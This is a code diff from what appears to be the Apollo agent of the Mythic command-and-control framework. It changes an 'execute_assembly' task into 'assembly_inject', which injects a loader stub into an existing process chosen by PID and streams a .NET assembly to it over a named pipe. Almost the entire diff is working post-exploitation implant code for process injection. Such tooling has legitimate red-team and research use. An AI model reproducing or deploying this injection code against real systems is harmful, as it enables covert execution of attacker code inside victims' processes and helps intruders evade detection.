@@ -17,10 +17,10 @@ using ApolloInterop.Classes.Collections;
 
 namespace Tasks
 {
-    public class execute_assembly : Tasking
+    public class assembly_inject : Tasking
     {
         [DataContract]
-        internal struct ExecuteAssemblyParameters
+        internal struct AssemblyInjectParameters
         {
             [DataMember(Name = "pipe_name")]
             public string PipeName;
@@ -30,6 +30,8 @@ namespace Tasks
             public string AssemblyArguments;
             [DataMember(Name = "loader_stub_id")]
             public string LoaderStubId;
+            [DataMember(Name = "pid")]
+            public int PID;
         }
 
         private AutoResetEvent _senderEvent = new AutoResetEvent(false);
@@ -41,7 +43,7 @@ namespace Tasks
         private Action<object> _flushMessages;
         private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
         private bool _completed = false;
-        public execute_assembly(IAgent agent, Task task) : base(agent, task)
+        public assembly_inject(IAgent agent, Task task) : base(agent, task)
         {
             _sendAction = (object p) =>
             {
@@ -64,7 +66,7 @@ namespace Tasks
             _flushMessages = (object p) =>
             {
                 string output = "";
-                while(!_cancellationToken.IsCancellationRequested && !_completed)
+                while (!_cancellationToken.IsCancellationRequested && !_completed)
                 {
                     WaitHandle.WaitAny(new WaitHandle[]
                     {
@@ -103,10 +105,9 @@ namespace Tasks
             return new System.Threading.Tasks.Task(() =>
             {
                 TaskResponse resp;
-                Process proc = null;
                 try
                 {
-                    ExecuteAssemblyParameters parameters = _jsonSerializer.Deserialize<ExecuteAssemblyParameters>(_data.Parameters);
+                    AssemblyInjectParameters parameters = _jsonSerializer.Deserialize<AssemblyInjectParameters>(_data.Parameters);
                     if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                         string.IsNullOrEmpty(parameters.AssemblyName) ||
                         string.IsNullOrEmpty(parameters.PipeName))
@@ -118,43 +119,33 @@ namespace Tasks
                     }
                     else
                     {
-                        if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
+                        bool pidRunning = false;
+                        try
                         {
-                            if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
+                            System.Diagnostics.Process.GetProcessById(parameters.PID);
+                            pidRunning = true;
+                        } catch { pidRunning = false; }
+                        if (pidRunning)
+                        {
+                            if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
                             {
-                                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
-                                proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);
-                                if (proc.Start())
+                                if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
                                 {
-                                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                                        "",
-                                        false,
-                                        "",
-                                        new IMythicMessage[]
-                                        {
-                                            new Artifact
-                                            {
-                                                BaseArtifact = "ProcessCreate",
-                                                ArtifactDetails = string.IsNullOrEmpty(info.Arguments) ?
-                                                $"Started {info.Application} (PID: {proc.PID})" : 
-                                                $"Started {info.Application} {info.Arguments} (PID: {proc.PID})"
-                                            }
-                                        }
-                                    ));
-                                    if (proc.Inject(exeAsmPic))
+                                    var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
+                                    if (injector.Inject())
                                     {
                                         _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                                            "",
-                                            false,
-                                            "",
-                                            new IMythicMessage[]
-                                            {
+                                                "",
+                                                false,
+                                                "",
+                                                new IMythicMessage[]
+                                                {
                                                 new Artifact
                                                 {
                                                     BaseArtifact = "ProcessInject",
-                                                    ArtifactDetails = $"Injected into PID {proc.PID} using {_agent.GetInjectionManager().GetCurrentTechnique().Name}"
+                                                    ArtifactDetails = $"Injected into PID {parameters.PID} using {_agent.GetInjectionManager().GetCurrentTechnique().Name}"
                                                 }
-                                            }));
+                                                }));
                                         IPCCommandArguments cmdargs = new IPCCommandArguments
                                         {
                                             ByteData = assemblyBytes,
@@ -175,33 +166,35 @@ namespace Tasks
                                             _complete.WaitOne();
                                             _completed = true;
                                             resp = CreateTaskResponse("", true, "completed");
-                                        } else
+                                        }
+                                        else
                                         {
                                             resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
                                         }
                                     }
                                     else
                                     {
-                                        resp = CreateTaskResponse(
-                                            $"Failed to inject assembly loader into sacrificial process.",
-                                            true,
-                                            "error");
+                                        resp = CreateTaskResponse($"Failed to inject into PID {parameters.PID}", true, "error");
                                     }
-                                } else
+                                }
+                                else
                                 {
-                                    resp = CreateTaskResponse($"Failed to start sacrificial process {info.Application}", true, "error");
+                                    resp = CreateTaskResponse(
+                                        $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
+                                        true,
+                                        "error");
                                 }
                             }
                             else
                             {
-                                resp = CreateTaskResponse(
-                                    $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
-                                    true,
-                                    "error");
+                                resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
                             }
                         } else
                         {
-                            resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
+                            resp = CreateTaskResponse(
+                                $"Process with ID {parameters.PID} is not running.",
+                                true,
+                                "error");
                         }
                     }
                 }
@@ -210,18 +203,6 @@ namespace Tasks
                     resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
                 }
                 _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-                if (!proc.HasExited)
-                {
-                    proc.Kill();
-                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", true, "", new IMythicMessage[]
-                    {
-                        new Artifact
-                        {
-                            BaseArtifact = "ProcessKill",
-                            ArtifactDetails = $"Killed PID {proc.PID}"
-                        }
-                    }));
-                }
             }, _cancellationToken.Token);
         }
 
